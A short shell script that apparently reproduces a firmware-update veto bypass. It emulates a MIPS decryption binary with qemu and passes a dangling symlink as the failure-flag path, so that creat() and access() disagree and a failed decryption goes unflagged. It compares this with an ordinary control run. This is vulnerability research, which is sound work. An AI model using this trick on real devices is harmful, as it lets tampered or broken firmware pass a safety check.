#!/bin/sh
# Reproduce the veto bypass: decry_firm creates the failure flag with creat(),
# check_fw tests it with access(), and a dangling symlink makes them disagree.
#
#   ./flag-symlink-test.sh /path/to/extracted-rootfs /path/to/plaintext-image.bin
#
# Needs qemu-mipsel-static. Touches only the two directories given plus /tmp.
set -e
ROOTFS="${1:?usage: $0 <extracted rootfs> <plaintext image>}"
IMG="${2:?usage: $0 <extracted rootfs> <plaintext image>}"
WORK=$(mktemp -d)

run() { # $1 = flag path to pass as argv[2]
	cp "$IMG" "$WORK/image.bin"
	qemu-mipsel-static -L "$ROOTFS" "$ROOTFS/bin/decry_firm" "$WORK/image.bin" "$1" >/dev/null 2>&1 || true
	printf '  flag: %-8s  access(): %s\n' \
		"$([ -e "$WORK/$2" ] && echo CREATED || echo absent)" \
		"$(test -e "$WORK/$2" && echo present || echo ENOENT)"
	cmp -s "$WORK/image.bin" "$IMG" && echo "  image: unchanged" || echo "  image: MODIFIED"
}

echo "control (ordinary path):"
run "$WORK/normalflag" normalflag
echo "poisoned path (dangling symlink):"
ln -sf /nonexistent-dir/x "$WORK/symflag"
run "$WORK/symflag" symflag
rm -rf "$WORK"
